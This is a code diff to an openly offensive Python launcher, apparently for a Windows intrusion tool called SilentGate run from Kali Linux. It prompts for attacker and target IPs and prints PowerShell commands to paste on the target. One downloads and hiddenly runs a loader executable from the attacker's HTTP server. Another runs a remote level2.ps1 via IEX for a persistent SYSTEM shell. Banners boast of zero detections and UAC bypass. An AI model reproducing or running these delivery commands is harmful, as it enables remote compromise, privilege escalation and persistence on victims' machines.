@@ -156,36 +156,24 @@ def start_listener(port):
     return proc
 
 def show_delivery_command(kali_ip, http_port, target_ip=""):
-    """Show the working delivery commands on screen"""
-    exe_url = f"http://{kali_ip}:{http_port}/output/sg_loader.exe"
-
-    line1 = f"New-Item -ItemType Directory -Path 'C:\\ProgramData\\lpe' -Force | Out-Null"
-    line2 = f"(New-Object Net.WebClient).DownloadFile('{exe_url}','C:\\ProgramData\\lpe\\sg_loader.exe')"
-    line3 = f"Start-Process 'C:\\ProgramData\\lpe\\sg_loader.exe' -WindowStyle Hidden"
-
-    t = f"RUN ON TARGET: {target_ip}" if target_ip else "RUN ON TARGET WINDOWS MACHINE"
-    sep = "═" * 68
-
+    exe_url  = f"http://{kali_ip}:{http_port}/output/sg_loader.exe"
+    lvl2_url = f"http://{kali_ip}:{http_port}/output/level2.ps1"
     print()
-    print(f"{D}╔{sep}╗{X}")
-    print(f"{D}║{X}{R}{B}{t:^68}{X}{D}║{X}")
-    print(f"{D}╠{sep}╣{X}")
-    print(f"{D}║{X}")
-    print(f"  {G}{line1}{X}")
-    print(f"  {G}{line2}{X}")
-    print(f"  {G}{line3}{X}")
-    print(f"{D}║{X}")
-    print(f"{D}╠{sep}╣{X}")
-    print(f"{D}║{X}  {R}Zero detections  Zero UAC  Works Win10+Win11{X}{D}{'':>22}║{X}")
-    print(f"{D}╠{sep}╣{X}")
-    print(f"{D}║{X}  {W}SilentGate waterfall:{X}{D}{'':>47}║{X}")
-    print(f"{D}║{X}  {R}Level 0{D} steal_token.exe → SYSTEM (driver){D}{'':>26}║{X}")
-    print(f"{D}║{X}  {R}Level 1{D} Kernel IOCTL   → SYSTEM (driver){D}{'':>26}║{X}")
-    print(f"{D}║{X}  {R}Level 2{D} COM hijack     → Medium zero UAC{D}{'':>27}║{X}")
-    print(f"{D}║{X}  {R}Level 3{D} Direct shell   → Medium fallback{D}{'':>28}║{X}")
-    print(f"{D}╚{sep}╝{X}")
+    print(f"\033[91m  {'─'*65}\033[0m")
+    print(f"\033[91m  LEVEL 1 — MEDIUM SHELL  Zero UAC  Zero detections\033[0m")
+    print(f"\033[91m  {'─'*65}\033[0m")
     print()
-
+    print(f"  \033[37mNew-Item -ItemType Directory -Path 'C:\\ProgramData\\lpe' -Force | Out-Null\033[0m")
+    print(f"  \033[37m(New-Object Net.WebClient).DownloadFile('{exe_url}','C:\\ProgramData\\lpe\\sg_loader.exe')\033[0m")
+    print(f"  \033[37mStart-Process 'C:\\ProgramData\\lpe\\sg_loader.exe' -WindowStyle Hidden\033[0m")
+    print()
+    print(f"\033[91m  {'─'*65}\033[0m")
+    print(f"\033[91m  LEVEL 2 — SYSTEM SHELL  One UAC click  Persistent\033[0m")
+    print(f"\033[91m  {'─'*65}\033[0m")
+    print(f"\033[90m  From medium shell run:\033[0m")
+    print()
+    print(f"  \033[91mIEX(New-Object Net.WebClient).DownloadString('{lvl2_url}')\033[0m")
+    print()
 
 def update_chain_ps1(kali_ip, port):
     """Update sg_chain.ps1 with correct IP and port"""
@@ -231,10 +219,24 @@ def main():
         print(f"{R}[!]{X} Install: sudo apt install mingw-w64")
         sys.exit(1)
 
-    print(f"{D}  Configure your attack:{X}")
+    # Mission briefing - clean no box
+    print(f"{R}  MISSION BRIEFING{X}")
+    print(f"{D}  {'─'*55}{X}")
+    print(f"  {W}LEVEL 1{X}  Medium shell  Zero UAC  Zero detections")
+    print(f"{D}           Use when : initial access to any Windows target{X}")
+    print(f"{D}           Method   : 3 commands on target then shell connects{X}")
+    print()
+    print(f"  {W}LEVEL 2{X}  SYSTEM shell  One UAC click  Persistent")
+    print(f"{D}           Use when : need full SYSTEM control + persistence{X}")
+    print(f"{D}           Method   : L1 shell then 1 command then YES then SYSTEM{X}")
+    print(f"{D}  {'─'*55}{X}")
     print()
 
-    # Get Kali IP
+    # Get configuration
+
+
+    print()
+
     detected_ip = detect_kali_ip()
     kali_ip   = get_input("  Your Kali IP", detected_ip)
     target_ip = get_input("  Target Windows IP", "")
@@ -242,12 +244,12 @@ def main():
     http_port = int(get_input("  HTTP server port", "8080"))
 
     print()
-    print(f"{D}  ════════════════════════════════════{X}")
-    print(f"  {W}Kali IP:{X}     {G}{kali_ip}{X}")
-    print(f"  {W}Target IP:{X}   {G}{target_ip}{X}")
-    print(f"  {W}Listen port:{X} {G}{port}{X}")
-    print(f"  {W}HTTP port:{X}   {G}{http_port}{X}")
-    print(f"{D}  ════════════════════════════════════{X}")
+
+
+
+
+
+
     print()
 
     confirm = input(f"  {W}Start? (Enter to continue / Ctrl+C to cancel){X}: ")
